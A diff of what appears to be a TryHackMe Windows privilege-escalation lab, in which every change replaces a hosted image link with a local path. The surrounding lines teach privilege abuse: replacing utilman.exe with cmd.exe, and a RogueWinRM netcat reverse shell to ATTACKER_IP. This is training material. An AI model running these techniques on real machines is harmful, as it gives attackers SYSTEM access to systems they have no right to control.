@@ -221,11 +221,11 @@ Here we can see that the associated executable is specified through the BINARY_
 
 Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):
 
-![Service DACL](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d8244cfd9d64a7be30f5fb0308fd0806.png)
+![Service DACL](images/d8244cfd9d64a7be30f5fb0308fd0806.png)
 
 All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:
 
-![Service registry entries](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c05c134e4922ec8ff8d9b56382c58f.png)
+![Service registry entries](images/06c05c134e4922ec8ff8d9b56382c58f.png)
 
 A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.
 
@@ -550,7 +550,7 @@ Having this power, an attacker can trivially escalate privileges on the system b
 
 This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:
 
-![Run as admin](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/befb434f15dbd4deee0654f8b6ef6de0.png)
+![Run as admin](images/befb434f15dbd4deee0654f8b6ef6de0.png)
 
 Once on the command prompt, we can check our privileges with the following command:
 
@@ -638,7 +638,7 @@ The SeTakeOwnership privilege allows a user to take ownership of any object on t
 
 To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:
 
-![Run as admin](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33303d0cde736589d2838ee894379ff2.png)
+![Run as admin](images/33303d0cde736589d2838ee894379ff2.png)
 
 Once on the command prompt, we can check our privileges with the following command:
 
@@ -656,7 +656,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
 
 We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
 
-![utilman normal behaviour](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png)
+![utilman normal behaviour](images/a5437a609e41d982b320967667e9b97a.png)
 
 Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.
 
@@ -685,11 +685,11 @@ C:\Windows\System32\> copy cmd.exe utilman.exe
 
 To trigger utilman, we will lock our screen from the start button:
 
-![lock screen](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png)
+![lock screen](images/dd7290ca93369cee33182023cb9190ff.png)
 
 And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:
 
-![utilman shell](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png)
+![utilman shell](images/1401bc3dcb1e4eb84f526b95567a5ef8.png)
 
 ## SeImpersonate / SeAssignPrimaryToken
 
@@ -699,13 +699,13 @@ Impersonation is easily understood when you think about how an FTP server works.
 
 Let's assume we have an FTP service running with user `ftp`. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:
 
-![FTP server without impersonation](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/006115497113a0a4f03008028dc32fb7.png)
+![FTP server without impersonation](images/006115497113a0a4f03008028dc32fb7.png)
 
 There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the `ftp` user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user `ftp`. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user `ftp`, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the `ftp` user has access.
 
 If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:
 
-![FTP server with impersonation](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c25de66ae7777169d09a61ce2fb38e28.png)
+![FTP server with impersonation](images/c25de66ae7777169d09a61ce2fb38e28.png)
 
 Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user `ftp` in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.
 
@@ -723,7 +723,7 @@ Let's start by assuming we have already compromised a website running on IIS and
 
 We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:
 
-![Webshell impersonate privileges](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png)
+![Webshell impersonate privileges](images/4603506a36f4bbda602dc67cdc845d9f.png)
 
 To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the `C:\tools\` folder.
 
@@ -745,7 +745,7 @@ And then, use our web shell to trigger the RogueWinRM exploit using the followin
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
 ```
 
-![RogueWinRM exploit execution](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24545e313a2e5ddee2386a68b4c7adeb.png)
+![RogueWinRM exploit execution](images/24545e313a2e5ddee2386a68b4c7adeb.png)
 
 Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.
 
@@ -798,7 +798,7 @@ A patch was issued, where they decided to check that the executed command starte
 
 To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:
 
-![Druva Exploit Diagram](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ff706d6530426d3123c0983acd61f934.png)
+![Druva Exploit Diagram](images/ff706d6530426d3123c0983acd61f934.png)
 
 The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.
 
@@ -848,7 +848,7 @@ Global Group memberships     *None
 
 As a last step, you can run a command prompt as administrator:
 
-![Run Command Prompt as Pwnd](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bbd0af143c9a9b31c1acce32fabfdc0f.png)
+![Run Command Prompt as Pwnd](images/bbd0af143c9a9b31c1acce32fabfdc0f.png)
 
 When prompted for credentials, use the `pwnd` account. From the new command prompt, you can retrieve your flag from the Administrator's desktop with the following command `type C:\Users\Administrator\Desktop\flag.txt`.
 
